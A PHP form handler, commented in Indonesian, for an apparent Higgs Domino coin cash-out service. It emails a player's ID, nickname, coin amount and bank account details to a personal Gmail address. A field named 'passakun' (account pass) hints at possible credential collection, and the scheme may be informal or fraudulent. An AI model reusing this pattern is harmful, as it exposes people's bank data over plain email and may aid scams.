<?php
// ========================================================================
// 1. KONFIGURASI PENGIRIMAN EMAIL
// ========================================================================

// Ganti dengan ALAMAT EMAIL TUJUAN Anda
$email_tujuan = "vibeaiagent@gmail.com"; 

// Ganti dengan NAMA PENGIRIM yang Anda inginkan
$nama_pengirim = "Admin Bongkar ID";
$email_dari = "noreply@namadomainanda.com"; // Gunakan email dari domain Anda untuk keandalan


// ========================================================================
// 2. AMBIL DAN AMANKAN DATA DARI FORMULIR (via POST)
// ========================================================================

// Cek apakah formulir telah disubmit
if ($_SERVER["REQUEST_METHOD"] == "POST") {

    // Ambil data dan amankan (sanitasi)
    $id_anda            = filter_input(INPUT_POST, 'passakun', FILTER_SANITIZE_NUMBER_INT);
    $nickname           = filter_input(INPUT_POST, 'nickname', FILTER_SANITIZE_STRING);
    $jumlah_bongkaran   = filter_input(INPUT_POST, 'Idakun', FILTER_SANITIZE_STRING); // Menggunakan STRING karena mungkin ada format koin (contoh: 1B, 10M)
    $bank_pencairan     = filter_input(INPUT_POST, 'narek', FILTER_SANITIZE_STRING);
    $nomor_rekening     = filter_input(INPUT_POST, 'norek', FILTER_SANITIZE_NUMBER_INT);
    $atas_nama          = filter_input(INPUT_POST, 'atasnama', FILTER_SANITIZE_STRING);

    // *Catatan: Input file upload ('filename') TIDAK diproses di sini.

    // ========================================================================
    // 3. SUSUN ISI EMAIL
    // ========================================================================

    $subjek_email = "TRANSAKSI BONGKAR BARU - " . $nickname . " (" . $id_anda . ")";

    $isi_email = "Halo Admin,\n\n";
    $isi_email .= "Anda menerima permintaan Bongkar Koin baru dengan rincian sebagai berikut:\n\n";
    
    $isi_email .= "==========================================\n";
    $isi_email .= "          INFO PENGIRIM (Higgs Domino)\n";
    $isi_email .= "==========================================\n";
    $isi_email .= "1. ID Anda (Pengirim) : " . $id_anda . "\n";
    $isi_email .= "2. Nickname             : " . $nickname . "\n";
    $isi_email .= "3. Jumlah Bongkaran     : " . $jumlah_bongkaran . " (Harap cek histori pengiriman)\n";
    $isi_email .= "------------------------------------------\n";
    $isi_email .= "Target ID Kirim         : 21640006\n";
    $isi_email .= "==========================================\n\n";

    $isi_email .= "==========================================\n";
    $isi_email .= "          INFO PENCERAIAN (Transfer)\n";
    $isi_email .= "==========================================\n";
    $isi_email .= "5. Bank Pencairan       : " . $bank_pencairan . "\n";
    $isi_email .= "6. Nomor Rekening       : " . $nomor_rekening . "\n";
    $isi_email .= "7. Atas Nama            : " . $atas_nama . "\n";
    $isi_email .= "==========================================\n";
    
    $isi_email .= "\n\nHarap segera proses transaksi ini dan konfirmasi screenshot dari pengirim.";


    // ========================================================================
    // 4. KIRIM EMAIL
    // ========================================================================

    // Headers untuk email
    $headers = "From: " . $nama_pengirim . " <" . $email_dari . ">\r\n";
    $headers .= "Reply-To: " . $email_dari . "\r\n";
    $headers .= "X-Mailer: PHP/" . phpversion();

    // Jalankan fungsi mail
    $sukses_kirim = mail($email_tujuan, $subjek_email, $isi_email, $headers);

    // ========================================================================
    // 5. REDIRECT / PESAN SUKSES
    // ========================================================================

    if ($sukses_kirim) {
        // Jika email berhasil dikirim, arahkan ke halaman terima kasih atau tampilkan pesan sukses
        // Anda bisa membuat file 'sukses.html' atau 'terima_kasih.php'
        header('Location: sukses.html'); 
        exit;
    } else {
        // Jika gagal (biasanya masalah konfigurasi server mail)
        echo "<h1>Kesalahan!</h1>";
        echo "<p>Gagal mengirim data melalui email. Silakan hubungi admin website secara manual.</p>";
    }

} else {
    // Jika diakses langsung tanpa submit form
    header('Location: index.html'); 
    exit;
}
?>
